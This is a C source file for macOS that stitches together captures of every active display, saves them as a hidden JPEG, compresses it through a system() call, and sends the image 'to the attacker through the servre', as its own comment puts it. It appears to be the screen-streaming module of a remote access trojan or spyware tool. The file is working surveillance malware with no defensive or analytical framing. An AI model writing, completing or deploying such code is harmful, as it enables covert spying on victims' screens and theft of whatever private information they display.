#include "connection.h"
#include "screenshot_capture.h"
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

SCREENSHOT_STATUS capture_screenshot() {
	CGDirectDisplayID displays[MAX_DISPLAYS_NUM];
	
	uint32_t count;
	
	if (CGGetActiveDisplayList(sizeof(displays)/sizeof(displays[0]), displays, &count) != kCGErrorSuccess) //failed to get display list
		return CAPTURE_FAILED;
		
	CGRect rect = CGRectNull;

	for (uint32_t i = 0; i < count; i++){ // if display is secondary mirror of another display, skip it
		if (CGDisplayMirrorsDisplay(displays[i]) != kCGNullDirectDisplay)
			continue;

		rect = CGRectUnion(rect, CGDisplayBounds(displays[i]));
	}

	CGColorSpaceRef colorspace = CGColorSpaceCreateWithName(kCGColorSpaceGenericRGB);
	if (!colorspace) // failed to create colorspace
		return CAPTURE_FAILED;
	
	CGContextRef cgcontext = CGBitmapContextCreate(NULL, CGRectGetWidth(rect), CGRectGetHeight(rect), 8, 0, colorspace,(CGBitmapInfo)kCGImageAlphaPremultipliedFirst);
	CGColorSpaceRelease(colorspace);
	if (!cgcontext) // failed to create bitmap context  	
		return CAPTURE_FAILED;
	
	CGContextClearRect(cgcontext, CGRectMake(0, 0, CGRectGetWidth(rect), CGRectGetHeight(rect)));

	for (uint32_t i = 0; i < count; i++){ // if display is secondary mirror of another display, skip it
		if (CGDisplayMirrorsDisplay(displays[i]) != kCGNullDirectDisplay)
			continue;

		CGRect displayRect = CGDisplayBounds(displays[i]);
		CGImageRef image = CGDisplayCreateImage(displays[i]);
		if (!image)
			continue;

		CGRect dest = CGRectMake(displayRect.origin.x - rect.origin.x, displayRect.origin.y - rect.origin.y, displayRect.size.width, displayRect.size.height);
		CGContextDrawImage(cgcontext, dest, image);
		CGImageRelease(image);
	}

	CGImageRef image = CGBitmapContextCreateImage(cgcontext);
	CGContextRelease(cgcontext);
	if (!image) // failed to create image from bitmap context
		return CAPTURE_FAILED;
		
	CFURLRef url = CFURLCreateWithFileSystemPath(NULL, CFSTR(SCREENSHOT_IMAGE_NAME), kCFURLPOSIXPathStyle, 0);
	if (!url) // failed to create URL
		return CAPTURE_FAILED;

	CGImageDestinationRef dest = CGImageDestinationCreateWithURL(url, kUTTypeJPEG, 1, NULL);
	
	CFRelease(url);
	if (!dest) //failed to create image destination
		return CAPTURE_FAILED;
	
	CGImageDestinationAddImage(dest, image, NULL);
	CGImageRelease(image);
	
	if (!CGImageDestinationFinalize(dest)) //failed to finalize image destination
		return CAPTURE_FAILED;
		
	CFRelease(dest);
	char compress_screenshot[60]; 
	sprintf(compress_screenshot, "convert -resize 70%% %s %s ", SCREENSHOT_IMAGE_NAME, SCREENSHOT_IMAGE_NAME);// exemple : convert -resize 70% .temp_screen.jpg .temp_screen.jpg
	system(compress_screenshot); // this commend compress the screenshot in order to deliver more screenshots per second
	send_file(SCREENSHOT_IMAGE_NAME, GET_SCREEN_STREAM, true); //  send the screenshot to the attacker through the servre
	
	return CAPTURE_SUCCESSFULLY;
}